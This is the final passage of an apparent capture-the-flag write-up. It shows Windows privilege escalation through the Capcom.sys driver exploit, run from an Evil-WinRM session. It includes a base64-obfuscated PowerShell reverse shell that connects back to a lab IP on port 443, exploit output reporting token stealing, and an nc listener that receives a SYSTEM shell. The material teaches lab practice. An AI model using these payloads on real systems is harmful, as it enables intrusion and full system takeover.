</span></span></span></code></pre></div><p>and, finally, execute the payload abusing <code>ExploitCapcom.exe</code> in the victim machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; C:\Windows\System32\spool\drivers\color\ExploitCapcom.exe EXPLOIT &#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYAOQAuADIAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Capcom.sys exploit
</span></span></span><span class=line><span class=cl><span class=go>[*] Capcom.sys handle was obtained as 0000000000000064
</span></span></span><span class=line><span class=cl><span class=go>[*] Shellcode was placed at 0000026321830008
</span></span></span><span class=line><span class=cl><span class=go>[+] Shellcode was executed
</span></span></span><span class=line><span class=cl><span class=go>[+] Token stealing was successful
</span></span></span><span class=line><span class=cl><span class=go>[+] Command Executed
</span></span></span></code></pre></div><p>and we get a shell as <code>nt authority/system</code> in our listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [192.168.69.2] from (UNKNOWN) [192.168.69.69] 58090
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nt authority\system
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PS C:\Users\Chivas Regal\Documents&gt;
</span></span></span></code></pre></div><p>We can finally read the root flag at <code>Administrador</code> desktop.</p><hr><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>